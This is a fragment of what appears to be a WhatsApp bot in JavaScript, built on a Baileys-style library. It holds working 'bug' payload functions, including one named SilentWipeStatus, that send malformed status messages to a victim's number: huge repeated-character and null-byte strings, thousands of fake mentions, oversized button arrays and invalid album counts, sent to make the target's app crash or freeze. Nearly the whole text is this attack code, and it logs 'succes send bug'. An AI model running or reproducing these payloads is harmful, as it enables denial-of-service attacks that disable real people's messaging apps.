          42, 71, 65, 199, 10, 164, 16, 57,
          189, 229, 54, 93, 69, 6, 212, 145,
        ]),
        fileEncSha256: Buffer.from([
          29, 27, 247, 158, 114, 50, 140, 73,
          40, 108, 77, 206, 2, 12, 84, 131,
          54, 42, 63, 11, 46, 208, 136, 131,
          224, 87, 18, 220, 254, 211, 83, 153,
        ]),
        directPath:
          "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
        mediaKeyTimestamp: 1746275400,

        contextInfo: {
          mentionedJid: Array.from(
            { length: 1900 },
            () => `62${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
          ),
          isSampled: true,
          participant: target,
          remoteJid: "status@broadcast",
          forwardingScore: 9741,
          isForwarded: true,
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net",
          },
        },
      },
    };

    const secondAudioMsg = generateWAMessageFromContent(
      target,
      {
        ...audioPayload2,
        contextInfo: {
          ...audioPayload2.contextInfo,
          participant: "0@s.whatsapp.net",
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 1900 },
              () => `62${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            ),
          ],
        },
      },
      {}
    );

    await sock.relayMessage("status@broadcast", secondAudioMsg.message, {
      messageId: secondAudioMsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: [],
                },
              ],
            },
          ],
        },
      ],
    });
 
 
const imageExploit = "https://files.catbox.moe/ykvioj.jpg";

  const metaMentions = [
    "13135550001@s.whatsapp.net",
    "13135550002@s.whatsapp.net",
    "13135550003@s.whatsapp.net",
    "13135550004@s.whatsapp.net",
    "13135550005@s.whatsapp.net",
    "13135550006@s.whatsapp.net",
    "13135550007@s.whatsapp.net",
    "13135550008@s.whatsapp.net",
    "13135550009@s.whatsapp.net",
    "13135550010@s.whatsapp.net"
  ];

  const imageMessage = {
    image: { url: imageExploit },
    caption: "꧂".repeat(60000)
  };

  const albumContainer = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 999,
      expectedVideoCount: 666
    }
  }, {
    userJid: target,
    upload: sock.waUploadToServer
  });

  await sock.relayMessage("status@broadcast", albumContainer.message, { messageId: albumContainer.key.id });

    const craftedMsg = await generateWAMessage(target, imageMessage, {
      upload: sock.waUploadToServer
    });

    const msgType = Object.keys(craftedMsg.message).find(t => t.endsWith('Message'));

    craftedMsg.message[msgType].contextInfo = {
      mentionedJid: [
        ...metaMentions,
        ...Array.from({ length: 1900 }, () =>
          `62${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
        )
      ],
      businessMessageForwardInfo: {
        businessOwnerJid: "6281212345678@s.whatsapp.net"
      },
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardedNewsletterMessageInfo: {
        newsletterName: "꧁".repeat(100),
        newsletterJid: "120363330344810280@newsletter",
        serverMessageId: 999
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: albumContainer.key
      }
    };

    craftedMsg.message.nativeFlowMessage = {
      buttons: [
        {
          type: "call_button",
          callButton: {
            displayText: "꧂".repeat(200),
            phoneNumber: "+6281212345678"
        }
      },
      {
          type: "url",
          urlButton: {
            displayText: "꧂".repeat(100),
            url: "https://wa.me/+6281212345678?text=" + encodeURIComponent("꧁".repeat(1500))
        }
      },
      {
          type: "unknown_type",
          weirdButton: {
            displayText: "꧂".repeat(100),
            payload: "\u0000".repeat(200)
        }
      },
    ],
      content: {
        namespace: "call_permission_request_namespace",
        name: "call_permission_request",
          params: [
            { 
              name: "call_type",
              value: "video" 
            },
            { 
              name: "permission_reason", 
              value: "\u0000".repeat(150) 
            },
            {
              name: "support_url", 
              value: "https://wa.me/+6281212345678" 
            }
        ]
      }
    };

    await sock.relayMessage("status@broadcast", craftedMsg.message, {
      messageId: craftedMsg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    await sock.relayMessage("status@broadcast", {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "xwar"
                    },
                    nativeFlowMessage: {
                        buttons: "\0".repeat(500000),
                        name: "address_message",
                        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"k\",\"landmark_area\":\"k\",\"address\":\"k\",\"tower_number\":\"k\",\"city\":\"Japanese\",\"name\":\"k\",\"phone_number\":\"555555\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"k | ${"\u0000".repeat(900000)}\"}}`,
                        version: 3,
                        body: {
                            text: "Null"
                        },
                        contextInfo: {
                            remoteJid: "undefined@s.whatsapp.net",
                            mentionedJid: ["undefined@s.whatsapp.net"],
                            isForwarded: true,
                            forwardingScore: 9999,
                            parentGroupJid: "0@g.us"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 100000 }, () => ({}))
                        }
                    }
                }
            }
        }
    }, {
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{
                        tag: "to",
                        attrs: { jid: target }
                    }]
                }]
            }
        ]
    });
    
try {
      await sock.chatModify({ clear: true }, target);
            console.log("CONNECTED");
        } catch (error) {
            console.error("FAILED:", error);
        }
        await new Promise(resolve => setTimeout(resolve, 500));
    }
  }
}

// Func 2
async function SilentWipeStatus(sock, target) {
  const GhostPayload = [
    {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1995 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
              ],
              groupMentions: [],
              entryPointConversionSource: "non_contact",
              entryPointConversionApp: "whatsapp",
              entryPointConversionDelaySeconds: 467593,
            },
            stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
          },
        },
      },
    },
    {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/webp",
            fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
            fileLength: "1173741824",
            mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
            fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
            directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
            mediaKeyTimestamp: "1743225419",
            isAnimated: false,
            viewOnce: false,
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from({ length: 1995 }, () => "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
              ],
              isSampled: true,
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 9999,
              isForwarded: true,
              quotedMessage: {
                viewOnceMessage: {
                  message: {
                    interactiveResponseMessage: {
                      body: { text: "", format: "DEFAULT" },
                      nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(1045000),
                        version: 3,
                      },
                    },
                  },
                },
              },
            },
          },
        },
      },
    },
    {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
        mimetype: "image/jpeg",
        caption: " X ",
        fileSha256: "qFarb5UsIY5yngQKA6MylUxShVLYgna4T0huGHDOMrw=",
        fileLength: "149502",
        height: 1397,
        width: 1126,
        mediaKey: "5nwlQgrmasYJIgmOkI6pgZlpRCZ7Qqx04G7lMoh4SRM=",
        fileEncSha256: "XM2q+iwypSX8r4TLT+dd/oB9R2iLGuSw+nIKP9EdnSw=",
        directPath: "/v/t62.7118-24/598799587_1007391428289008_8291851315917551033_n.enc?ccb=11-4&oh=01_Q5Aa4QEecQfG2xN6_RkPXn8UtCa0fmWNTyXDBfEqsuHnx6NvRQ&oe=6A1BB373&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1777621571",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJCR0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFL/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIhEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFCR/9oACAEBAAE/AP7FNnt/Pj//2Q==",
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          isQuestion: true
        },
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        scanLengths: [
          2560752640,
          2478045696,
          578944000,
          3047881856
        ],
        midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
      }
    }
  ];

  const GhostPayload2 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "X", 
            format: "EXTENTION_1" 
          },
          nativeFlowResponseMessage: {
            name: "address_message", 
            paramsJson: `{\"display_text\":\"${" ".repeat(1000000)}\",\"id\":\".zer0x\",\"description\":\"Xwrcvzz.\"}`, 
            version: 3
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, (_, z) => `1313555020${z + 1}@s.whatsapp.net`), 
            statusAttributionType: "SHARED_FROM_MENTION",
          }, 
        }
      }
    }
  };

  for (const a of GhostPayload) {
    await sock.relayMessage("status@broadcast", a, {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { status_setting: "contacts" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: [],
                },
              ],
            },
          ],
        },
      ],
    });
  }

  await sock.relayMessage("status@broadcast", GhostPayload2, {
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: { status_setting: "contacts" },
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: [],
              },
            ],
          },
        ],
      },
    ],
  });
  console.log("succes send bug");
}

// ------ ( akhir off function ) ------ //

bot.launch();
